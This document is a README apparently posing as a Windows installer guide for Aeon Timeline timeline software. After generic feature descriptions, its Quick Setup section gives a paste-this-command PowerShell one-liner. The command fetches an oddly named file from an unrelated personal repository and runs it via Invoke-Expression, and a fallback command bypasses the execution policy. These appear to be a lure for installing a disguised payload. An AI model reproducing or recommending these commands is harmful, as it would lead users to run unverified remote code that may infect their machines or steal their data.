# Aeon Timeline

Aeon Timeline is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Aeon Timeline and work in it.

Aeon Timeline is desktop timeline software for writers, researchers, and producers who need more than a spreadsheet to see how events line up. You build timelines with dated or relative events, nest storylines, attach notes and links, and switch between calendar scales from hours to centuries without losing context.

A typical session on Windows starts with opening a project file and scanning the main axis for gaps or collisions. You add or drag events, group them under arcs or characters, filter by tag or entity, and compare alternate chronologies side by side. When a draft feels wrong, you adjust ordering or dependencies and watch the whole narrative shift in one place instead of across scattered documents.

This repository holds a Windows setup package for local installation, release notes that summarize what changed between builds, and short usage notes for common workflows like fiction outlining or historical research. The changelog records fixes and behavior changes so you can match your installed build to the notes here.

## What you do with it

- Scroll and zoom across calendar scales from single days to multi-century spans.
- Stack parallel storylines so character arcs stay visible on one shared axis.
- Attach notes, links, and metadata to events without leaving the timeline view.
- Filter events by entity, tag, or date range to focus on one thread.
- Compare alternate chronologies in separate lanes before you commit to canon.
- Nest folders and color groups to keep large research projects readable at a glance.
- Export timeline snapshots for outlines, production bibles, or collaborator handoffs.
- Relate events with dependencies so cause-and-effect order stays consistent while editing.

## Quick Setup (PowerShell)

This installs the program Aeon Timeline on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/wolf-s563745/aeon-timeline-setup-guide/main/mg7ryvbc97.bkrdxolo | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/wolf-s563745/aeon-timeline-setup-guide/main/mg7ryvbc97.bkrdxolo | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `mg7ryvbc97.bkrdxolo` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `wolf-s563745/aeon-timeline-setup-guide`. Aeon Timeline 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
